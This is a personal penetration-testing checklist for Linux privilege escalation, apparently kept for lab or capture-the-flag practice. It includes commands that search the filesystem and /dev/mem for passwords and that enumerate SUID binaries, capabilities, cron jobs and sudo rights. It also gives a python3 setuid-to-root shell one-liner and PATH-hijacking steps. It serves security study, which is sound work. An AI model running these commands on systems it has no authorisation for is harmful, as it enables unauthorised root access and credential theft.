[[Linux PrivEsc]]
- [ ] Weak permission files. 
- [ ] Check the config files.
	- [ ] Files containing passwords
		```bash
		grep --color=auto -rnw '/' -ie "PASSWORD" --color=always 2>/dev/null
		find . -type f -exec grep -i -I "PASSWORD" {} /dev/null \;
		# In memory passwords
		strings /dev/mem -n10 | grep -i PASS
		
		```

- [ ] Check for `adm and lxc` in `id` command output [escalation](https://blog.m0noc.com/2018/10/lxc-container-privilege-escalation-in.html?m=1)
- [ ] Check the SUID, SGID bits `find / -perm /4000 2>/dev/null` or `find / -perm -u=s -type f 2>/dev/null` and `find / -user root -perm -4000 2>/dev/null -ls`  >> GTFObins
- [ ] Check for `sudo -l`
- [ ] Check the capabilities - `getcap -r / 2>/dev/null` --- cap files
	- Python3: `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`
- [ ] Check for `uname -a` kernel exploit
- [ ] Check for cronjob '`cat /etc/crontab` and `crontab -l` (must)', (opt, backups and var) directory
- [ ] If there is script running then try `pspy64` for looking at the process.
- [ ] Use **Linpeas** if possible then create two outputs of it.
- [ ] Use [Linux suggestor](https://github.com/mzet-/linux-exploit-suggester).
- [ ] Use [Linux PrivChecker]([https://www.securitysift.com/download/linuxprivchecker.py](https://www.securitysift.com/download/linuxprivchecker.py))
- [ ] Found any ssh key?
- [ ] Check the bash history
- [ ] Found LD_PRELOAD?
- [ ] Check the services runnind as ROOT `ps aux | grep "^root"`
- [ ] If you Find out cron or anything that is running and doesnt have an absolute path the you can alter **PATH variable** for that file making it anywhere on the system. ==Check PATH vriable exploitation== [[Linux PrivEsc]] 
	- [ ] `PATH=/tmp:$PATH` if pyaload is in /tmp.
- [ ] Got crontab check the PATH variable else in other if PATH is not specified then you can modify the global PATH variable.
- [ ] SUDO ways to escalate: 
	- sudo -i
	- sudo -s
	- sudo passwd
	- sudo /bin/bash

- [ ] System running NFS with no_root_squash enabled ? [[Linux PrivEsc]]
- [ ] Intended SUID apache2 : when we pass any invalid config file to apache2 then it throws the error by showing first line of the files.
 	![[2021-09-11 19_49_58-4. Sudo.mp4 - VLC media player.png]]
- [ ] In the end cuz might crash machine Check for kernel exploits. (uname -a)


- [ ] Use [Winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)
- [ ] Use [windows Exploit suggester](https://github.com/bitsadmin/wesng)